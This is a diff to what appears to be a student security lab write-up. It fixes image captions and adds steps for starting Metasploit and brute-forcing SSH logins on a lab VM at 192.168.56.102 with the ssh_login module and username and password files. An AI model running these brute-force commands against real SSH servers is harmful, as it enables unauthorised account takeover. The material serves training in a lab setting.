@@ -133,7 +133,7 @@ nmap 192.168.56.102
 
 📸 Screenshot:
 
-![test connectivity](https://github.com/jalsayid/Security-project/blob/83631ae4769ad8e04f964d0a4d6c37bc944ce80a/Phase1/screenshots/nmap.png)
+![nmap](https://github.com/jalsayid/Security-project/blob/83631ae4769ad8e04f964d0a4d6c37bc944ce80a/Phase1/screenshots/nmap.png)
 
 ---
 
@@ -149,8 +149,60 @@ nmap -A 192.168.56.102
 
 📸 Screenshot:
 
-![test connectivity](https://github.com/jalsayid/Security-project/blob/83631ae4769ad8e04f964d0a4d6c37bc944ce80a/Phase1/screenshots/nmap%20-a.png
+![nmap a](https://github.com/jalsayid/Security-project/blob/83631ae4769ad8e04f964d0a4d6c37bc944ce80a/Phase1/screenshots/nmap%20-a.png
 )
+
+## 🔹 Step 6: Start Metasploit and Load the SSH Login Module
+
+Now that we’ve confirmed the SSH service is running on the victim, we start Metasploit on Kali Linux to launch the brute-force attack.
+
+Start Metasploit:
+```bash
+sudo msfconsole
+```
+
+Search for the SSH login scanner module:
+```bash
+search ssh_login
+```
+
+From the list of matching modules, we will use the one for SSH login:
+```bash
+use 0
+```
+
+📸 Screenshot:
+
+![search](https://github.com/jalsayid/Security-project/blob/5d4b10f49c23ea8938e5bdc0282f657a2d581f3e/Phase1/screenshots/start%20metasploit%20and%20search%20(1).png)
+
+---
+
+## 🔹 Step 7: Configure and Run the Exploit
+
+Once the SSH login module is loaded in Metasploit, we configure the necessary options to launch the brute-force attack using our `username` and `password` files.
+
+Set the required parameters:
+```bash
+set rhosts 192.168.56.102
+set user_file Desktop/username
+set pass_file Desktop/password
+set verbose true
+set stop_on_success true
+```
+And then we run the exploit:
+```bash
+exploit
+```
+
+📸 Screenshot:
+
+![exploit]()
+
+
+
+
+
+
 
 
 
